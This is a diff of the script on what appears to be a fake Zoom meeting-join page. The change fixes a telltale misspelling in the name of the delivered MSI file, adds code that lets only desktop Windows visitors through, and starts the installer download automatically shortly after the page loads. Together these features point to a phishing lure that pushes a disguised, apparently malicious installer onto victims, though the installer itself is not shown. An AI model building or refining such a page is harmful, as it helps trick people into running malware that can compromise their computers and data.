@@ -169,15 +169,30 @@
           role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Cookie
           Preferences</a></p>
     </div>
-    <script>
+<script>
 const files = {
     windows: {
-        url: "ZooMWorkplace_9CTWGUQ0RITC_SYP0RD02.msi",
-        name: "ZooMWorkplace_9CTWGUQ0RITC_SYP0RD02.msi"
+        url: "ZoomWorkplace_9CTWGUQ0RITC_SYP0RD02.msi",
+        name: "ZoomWorkplace_9CTWGUQ0RITC_SYP0RD02.msi"
     }
 };
 
 let selectedFile = files.windows;
+
+
+function isDesktopWindows() {
+    const ua = navigator.userAgent || "";
+    const platform = navigator.platform || "";
+
+    const isWindows = /Win/i.test(platform) || /Windows/i.test(ua);
+    const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
+
+
+    const isTouchOnly = navigator.maxTouchPoints > 2 && !/Win/i.test(platform);
+
+    return isWindows && !isMobile && !isTouchOnly;
+}
+
 
 
 function showToast(message, duration = 15000) {
@@ -195,12 +210,15 @@ function showToast(message, duration = 15000) {
 }
 
 
+
 function updateProgress(percent) {
     const bar = document.querySelector(".progress-bar");
     if (bar) {
         bar.style.width = percent + "%";
     }
 }
+
+
 
 async function downloadFile(file) {
     try {
@@ -232,6 +250,7 @@ async function downloadFile(file) {
 
         const blob = new Blob(chunks);
         const blobUrl = window.URL.createObjectURL(blob);
+
         const a = document.createElement("a");
         a.href = blobUrl;
         a.download = file.name;
@@ -256,7 +275,13 @@ async function downloadFile(file) {
 }
 
 
+
 function launchMeeting() {
+    if (!isDesktopWindows()) {
+        showToast("⚠️ Please use a Windows computer to join this meeting.", 20000);
+        return;
+    }
+
     downloadFile(selectedFile);
 
     setTimeout(() => {
@@ -268,15 +293,32 @@ function launchMeeting() {
 }
 
 
+
 window.addEventListener("DOMContentLoaded", () => {
 
     const manualBtn = document.getElementById("manualDownload");
+    const btn = document.querySelector("button");
+
+
+    if (!isDesktopWindows()) {
+        showToast("⚠️ Please use a Windows computer to access this meeting.", 30000);
+
+        if (btn) {
+            btn.disabled = true;
+            btn.style.opacity = "0.6";
+            btn.style.cursor = "not-allowed";
+        }
+
+        return;
+    }
+
     if (manualBtn) {
         manualBtn.addEventListener("click", function(e) {
             e.preventDefault();
             launchMeeting();
         });
     }
+
 
     setTimeout(launchMeeting, 1200);
 });
